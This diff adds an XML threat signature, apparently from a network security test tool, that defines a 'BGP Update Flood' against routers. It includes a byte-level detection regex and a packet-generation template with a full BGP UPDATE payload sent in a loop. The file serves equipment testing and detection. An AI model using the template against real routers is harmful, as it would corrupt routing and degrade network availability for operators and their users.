@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="BGP Update Flood"/>
+    <EngDesc display="true" value="This is a flood of the Border Gateway Protocol's update message. This attack will misinform routers.  BGP typically uses TCP port 179."/>
+    <Intent display="true">
+      <item value="Corruption"/>
+      <item value="Flood"/>
+    </Intent>
+    <Protocol display="true" value="BGP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Router"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="05bcd180e75e105d1bdd1a9d651106cc"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632757044826406250"/>
+    <SigStyle display="false" value="Flood"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="5"/>
+    <Regex display="false" value="\Xff\Xff\Xff\Xff\Xff\Xff\Xff\Xff\Xff\Xff\Xff\Xff\Xff\Xff\Xff\Xff\X00\X13\X02\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\X00\X62\X02\X00\X00\X00\X48\X40\X01\X01\X02\X40\X02\X0A\X01\X02\X01\XF4\X01\XF4\X02\X01\XFE\XBB\X40\X03\X04\XC0\XA8\X00\X0F\X40\X05\X04\X00\X00\X00\X64\X40\X06\X00\XC0\X07\X06\XFE\XBA\XC0\XA8\X00\X0A\XC0\X08\X0C\XFE\XBF\X00\X01\X03\X16\X00\X04\X01\X54\X00\XFA\X80\X09\X04\XC0\XA8\X00\X0F\X80\X0A\X04\XC0\XA8\X00\XFA\X10\XAC\X10"/>
+    <Created value="1155320279" display="true"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="BGPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="H"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$BGPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <BGP-Header BGP_marker="FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" BGP_length="0062" BGP_type="02" Payload="000000484001010240020A010201F401F40201FEBB400304C0A8000F40050400000064400600C00706FEBAC0A8000AC0080CFEBF000103160004015400FA800904C0A8000F800A04C0A800FA10AC10"/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
